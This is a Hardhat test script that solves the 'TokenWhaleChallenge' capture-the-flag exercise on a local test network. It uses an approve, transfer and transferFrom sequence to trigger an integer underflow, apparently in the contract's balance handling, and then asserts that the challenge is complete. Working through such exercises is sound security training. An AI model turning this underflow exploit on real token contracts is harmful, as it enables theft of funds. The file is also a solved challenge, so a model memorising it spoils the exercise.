import { expect } from "chai";
import { ethers } from "hardhat";

const { utils } = ethers;

describe("TokenWhaleChallenge", () => {
  it.only("Solves the challenge", async () => {
    const [attacker, helper, receiver] = await ethers.getSigners()
    const contractFactory = await ethers.getContractFactory("TokenWhaleChallenge")
    const value = utils.parseEther("1")
    const contract = await contractFactory.deploy(attacker.address)
    await contract.deployed()

    const approveTx = await contract.connect(helper).approve(attacker.address, 1000)
    await approveTx.wait()

    const transfer1Tx = await contract.connect(attacker).transfer(helper.address, 600)
    await transfer1Tx.wait()

    const overflowTx = await contract.connect(attacker).transferFrom(helper.address, receiver.address, 600)
    await overflowTx.wait()

    expect(await contract.isComplete()).to.be.true;
  });
});